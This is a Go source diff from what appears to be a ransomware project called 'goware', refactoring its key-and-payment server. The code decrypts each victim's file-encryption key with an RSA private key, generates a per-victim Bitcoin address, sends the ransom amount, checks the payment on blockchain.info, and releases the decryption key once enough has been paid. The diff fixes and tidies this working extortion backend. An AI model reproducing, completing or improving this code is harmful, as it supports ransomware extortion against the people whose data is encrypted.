@@ -7,7 +7,6 @@ import (
 	"encoding/hex"
 	"encoding/json"
 	"fmt"
-	"goware/models"
 	"io/ioutil"
 	"log"
 	"math/big"
@@ -16,8 +15,9 @@ import (
 	"os"
 	"strconv"
 
+	"github.com/nikola43/goware/models"
+	"github.com/nikola43/goware/network"
 	"github.com/nikola43/goware/utils"
-	"github.com/nikola43/goware/networks"
 	"github.com/tkanos/gonfig"
 )
 
@@ -26,7 +26,7 @@ var Key rsa.PrivateKey
 func init() {
 	Key = rsa.PrivateKey{
 		PublicKey: rsa.PublicKey{
-			N: utils.utils.FromBase10(""), // modify this
+			N: utils.FromBase10(""), // modify this
 			E: 65537,
 		},
 		D: utils.FromBase10(""), // this too
@@ -38,19 +38,8 @@ func init() {
 	Key.Precompute()
 }
 
-type Victim struct {
-	priv_address string
-	address      string
-	key          []byte
-}
-
-type Configuration struct {
-	Satoshi       int
-	Confirmations int
-}
-
-var configuration = Configuration{}
-var victims = map[string]Victim{}
+var configuration = models.Configuration{}
+var victims = map[string]models.Victim{}
 
 func handler(w http.ResponseWriter, req *http.Request) {
 	if req.URL.Path != "/key/" {
@@ -85,25 +74,25 @@ func handler(w http.ResponseWriter, req *http.Request) {
 		}
 		log.Printf("Key decrypted succesfuly: %x\n", aes_key)
 
-		wif, err := network.networks["btc"].CreatePrivateKey()
+		wif, err := network.Networks["btc"].CreatePrivateKey()
 		if err != nil {
 			log.Fatal(err)
 		}
 		log.Printf("Generated private address: %s\n", wif.String())
 
-		address, err := network.networks["btc"].GetAddress(wif)
+		address, err := network.Networks["btc"].GetAddress(wif)
 		if err != nil {
 			log.Fatal(err)
 		}
 		log.Printf("Generated public address: %s\n", address.EncodeAddress())
 
-		victims[id] = Victim{
+		victims[id] = models.Victim{
 			wif.String(),
 			address.EncodeAddress(),
 			aes_key,
 		}
 		json.NewEncoder(w).Encode(models.PaymentInfo{
-			victims[id].address,
+			victims[id].Address,
 			strconv.Itoa(configuration.Satoshi),
 		})
 		log.Println("Payment information sent!")
@@ -135,7 +124,7 @@ func handler(w http.ResponseWriter, req *http.Request) {
 		payload := url.Values{}
 		payload.Set("confirmations", strconv.Itoa(configuration.Confirmations))
 
-		resp, err := http.Get("https://blockchain.info/q/addressbalance/" + victims[id].address + "?" + payload.Encode())
+		resp, err := http.Get("https://blockchain.info/q/addressbalance/" + victims[id].Address + "?" + payload.Encode())
 		if err != nil {
 			log.Fatal(err)
 		}
@@ -150,7 +139,7 @@ func handler(w http.ResponseWriter, req *http.Request) {
 
 		if amount >= configuration.Satoshi {
 			log.Printf("Sending decryption key to: %s", id)
-			fmt.Fprintf(w, hex.EncodeToString(victims[id].key))
+			fmt.Fprintf(w, hex.EncodeToString(victims[id].Key))
 		}
 	default:
 		fmt.Fprintf(w, "Sorry, only GET and POST methods are supported.")
